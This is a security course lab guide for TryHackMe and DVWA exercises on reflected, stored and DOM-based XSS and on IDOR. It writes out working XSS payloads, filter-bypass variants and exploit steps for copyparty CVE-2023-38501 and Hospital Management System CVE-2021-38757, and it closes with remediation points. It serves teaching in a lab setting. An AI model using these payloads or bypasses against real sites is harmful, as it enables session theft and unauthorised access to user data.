# Lab Guide: Week 8 — XSS & Access Control

---

## Part 1: TryHackMe — XSS (In-Depth)
### https://tryhackme.com/room/axss

**Time:** 3-4 hours | **Difficulty:** Beginner-Intermediate

---

### Task 2: Terminology and Types

**Key distinctions to lock in before proceeding:**

| Type | Payload travels through | Persists? |
|------|-------------------------|-----------|
| Reflected | Server (same request/response) | No |
| Stored | Server (database) | Yes |
| DOM-Based | Never leaves the browser | No |

---

### Task 3: Causes and Implications

**Root cause checklist:**
- [ ] Identify: does the app filter input (blacklist) or encode output (allowlist)?
- [ ] Blacklist filtering = defeatable by definition (must guess every bypass)
- [ ] Output encoding = defeats every bypass automatically

---

### Task 4: Reflected XSS

**Practice payloads to test understanding:**
```
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
```

---

### Task 5: Vulnerable Web Application 1 — copyparty (CVE-2023-38501)

**Steps:**
```
1. Identify the injection point: ?k304= or ?setck= parameter
2. Craft payload: y <img src=copyparty onerror=alert(1)>
3. URL-encode: ?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
4. Submit and confirm alert() fires
```

**Document:**
```
CVE: CVE-2023-38501
Injection point: [parameter]
Payload: [exact payload]
Result: [confirmed/not confirmed]
```

---

### Task 6: Stored XSS

**Practice payloads:**
```
<script>alert(document.cookie)</script>
<img src=x onerror=alert(document.cookie)>
```

**Key test:** After submitting, navigate away and return to the page. If the alert fires again without resubmitting — confirmed stored (persistent).

---

### Task 7: Vulnerable Web Application 2 — Hospital Management System (CVE-2021-38757)

**Steps:**
```
1. Navigate to contact.php
2. Submit message field (txtMsg) with payload:
   <script>alert("Simple XSS")</script>
3. Log in as Receptionist/Admin role
4. Open Messages inbox
5. Confirm payload executes automatically on page view
```

**Document:**
```
CVE: CVE-2021-38757
Field: txtMsg (contact.php)
Payload: [exact payload]
Trigger: [which role's page view executes it]
Result: [confirmed/not confirmed]
```

---

### Task 8: DOM-Based XSS

**Conceptual exercise (fictional static site demonstration in-room):**
```
1. Identify a client-side source: window.location.hash, document.URL, etc.
2. Identify a dangerous sink: innerHTML, document.write(), eval()
3. Confirm: does the payload ever appear in server logs? (It should NOT
   for true DOM-based XSS — this is the defining characteristic)
```

---

### Task 9: Context and Evasion

**Practice each context escape:**
```
HTML tag body context:
  <script>alert(1)</script>

HTML attribute context:
  "><script>alert(1)</script>

JavaScript string context:
  ';alert(1)//

Whitespace-encoded evasion (legacy, document expected result):
  <IMG SRC="jav&#x09;ascript:alert('XSS');">
```

**Document:** For each, note whether your test browser still executes it — modern browsers may block the whitespace-encoded example.

---

### Task 10: Remediation

**Key points to record:**
```
1. Output encoding (htmlspecialchars, framework auto-escaping) — primary fix
2. Content-Security-Policy — defense in depth
3. HttpOnly cookie flag — limits damage even if XSS occurs
4. Blacklist filtering — explicitly NOT sufficient on its own
```

---

## Part 2: DVWA XSS Practice

**Setup:**
```
1. Start DVWA (local or TryHackMe machine)
2. DVWA Security → Low
3. Navigate to XSS (Reflected) module
```

### Reflected XSS — All Three Levels

**Low:**
```
URL: /vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>
Expected: Immediate alert with session cookie
```

**Medium (change DVWA Security to Medium):**
```
URL: /vulnerabilities/xss_r/?name=<scr<script>ipt>alert(document.cookie)</script>
Expected: str_replace bypass — alert fires
```

**High (change DVWA Security to High):**
```
URL: /vulnerabilities/xss_r/?name=<img src=x onerror=alert(document.cookie)>
Expected: preg_replace bypass via event handler — alert fires
```

### Stored XSS — All Three Levels

**Low:**
```
Navigate to: XSS (Stored)
Message field: <script>alert('you have been hacked')</script>
Submit → Navigate away → Return → Confirm alert re-fires
```

**Medium:**
```
1. Right-click Name field → Inspect Element
2. Change maxlength="10" to maxlength="100"
3. Name field: <scr<script>ipt>alert(document.cookie)</script>
4. Message field: leave normal (strip_tags will remove any HTML anyway)
5. Submit → Confirm alert fires on page load
```

**High:**
```
1. Repeat maxlength DevTools bypass on Name field
2. Name field: <img src=x onerror=alert(1)>
3. Submit → Confirm alert fires on page load
```

---

## Part 3: IDOR Practice

**Test procedure:**
```
1. Log in as a normal user, note your own profile URL/ID
   e.g., /user/profile?id=5
2. Change only the id parameter to an adjacent number
   /user/profile?id=6
3. Observe: does the response return another user's data?
4. If yes: document exactly what fields are exposed
```

**Document:**
```
Original URL: [your own ID]
Modified URL: [adjacent ID]
Data exposed: [username / email / other fields]
Authorization check present: [yes/no]
```

---

## Completion Checklist

### TryHackMe XSS Room
- [ ] Task 2-3: Terminology and root causes understood
- [ ] Task 4-5: Reflected XSS + copyparty CVE exploited
- [ ] Task 6-7: Stored XSS + Hospital Mgmt System CVE exploited
- [ ] Task 8: DOM-based XSS concept understood
- [ ] Task 9: Context escape + evasion techniques practiced
- [ ] Task 10: Remediation recorded

### DVWA Practice
- [ ] Reflected Low/Medium/High — all 3 payloads confirmed
- [ ] Stored Low/Medium/High — all 3 payloads confirmed
- [ ] maxlength DevTools bypass performed on Medium and High

### IDOR
- [ ] User ID manipulation tested
- [ ] Data exposure documented

---

**Status:** Week 8 Lab Guide | Ready for Hands-On Practice
